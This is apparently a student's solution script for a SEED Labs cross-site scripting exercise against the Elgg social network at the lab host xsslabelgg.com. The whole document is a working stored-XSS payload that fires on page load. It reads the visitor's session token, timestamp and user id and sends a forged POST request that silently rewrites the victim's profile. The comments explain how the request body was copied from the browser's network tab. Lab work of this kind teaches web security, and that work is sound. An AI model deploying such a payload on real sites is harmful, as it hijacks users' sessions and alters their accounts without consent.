// solution 2


<script type="text/javascript">
	window.onload = function(){
		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		//and Security Token __elgg_token
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		var guid = "&guid="+elgg.session.user.guid;
		//Construct the content of your url.
		// ****from network tab of firebox I traced out the post request url... and also copy the post request body... then just modified that body to incorporate 
        // token ts and guid of the visiting user... this modified version will work as the content of the post request****
		var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
		var content=ts+token+"&name=seed+ubuntu&description=%3Cp%3Eseed+ubuntu%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1&briefdescription=1605062&accesslevel%5Bbriefdescription%5D=1&location=seed+ubuntu&accesslevel%5Blocation%5D=1&interests=seed+ubuntu&accesslevel%5Binterests%5D=1&skills=seed+ubuntu&accesslevel%5Bskills%5D=1&contactemail=killmeh%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=seed+ubuntu&accesslevel%5Bphone%5D=1&mobile=seed+ubuntu&accesslevel%5Bmobile%5D=1&website=https%3A%2F%2Fwww.killmeh.com%2Fwebsite&accesslevel%5Bwebsite%5D=1&twitter=seed+ubuntu&accesslevel%5Btwitter%5D=1"+guid //FILL IN
		//console.log(content);
		//console.log(elgg.session.user.guid!=elgg.page_owner.guid);
		if(elgg.session.user.guid!=elgg.page_owner.guid)
		{
		    //console.log('hi');
		    //console.log(content);
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>


